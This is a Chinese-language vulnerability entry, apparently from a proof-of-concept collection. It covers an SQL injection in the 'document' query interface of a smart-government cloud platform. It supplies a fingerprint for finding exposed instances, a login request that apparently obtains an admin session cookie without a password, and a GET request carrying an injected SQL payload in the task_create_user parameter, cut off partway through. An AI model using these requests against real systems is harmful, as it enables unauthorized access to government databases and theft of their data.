# 数字通云平台智慧政务系统document接口存在Sql注入漏洞

- **系统**：数字通云平台智慧政务系统document接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="assets/2efc01da"`
- **请求**：`POST /portal/default/login HTTP/1.1`

**请求体 / payload**
```
在响应头获取set-cookie字段
Host:
Cookie: GOASESSID=teee69jht7234nr1ei5uuutiu7
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
userID=admin&flag=rone
将获取到的cookie字段传入下面请求头
GET /document/query/index?Document%5Bdoc_title%5D=&Document%5Btype_id%5D=&Document%5Bdoc_num%5D=&Document%5Buser_doc_num%5D=&Document%5Bsecret_level%5D=&Document%5Bhurry_level%5D=&Document%5Bcreate_time%5D=2024-08-01+-+2024-08-29&Document%5Bbegin_dept%5D=&Document%5Bcreate_user%5D=&Document%5Bdoc_publicly%5D=&Document%5Bstatus%5D=&Document%5Barchive_status%5D=&Document%5Btask_create_user%5D=1%20AND%20(SELECT%202*(IF…（脚本共 798 字，完整版见原文）
```
- **预期**：302　|　—